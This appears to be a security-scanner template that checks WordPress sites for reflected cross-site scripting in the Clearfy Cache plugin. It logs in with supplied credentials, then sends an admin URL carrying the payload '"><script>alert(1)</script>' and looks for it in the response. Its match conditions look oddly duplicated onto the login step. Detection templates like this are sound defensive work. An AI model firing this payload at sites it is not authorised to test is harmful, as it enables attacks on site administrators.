id: clearfy-cache-xss
brief:
    title: WordPress Clearfy Cache <2.0.5 - Cross-Site Scripting
    by: Akincibor
    level: medium
    about: WordPress Clearfy Cache 2.0.5 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
    label:
        - xss
        - wp
        - wordpress
        - authenticated
        - clearfy-cache
        - wpscan
        - wp-plugin
        - vuln
    score: CVSS:5.4
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check
        Origin: '{{RootURL}}'
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      signs:
        - "on": word
          has:
            - '"><script>alert(1)</script>'
            - Webcraftic Clearfy - WordPress optimization plugin
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script>'
      signs:
        - "on": word
          has:
            - '"><script>alert(1)</script>'
            - Webcraftic Clearfy - WordPress optimization plugin
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
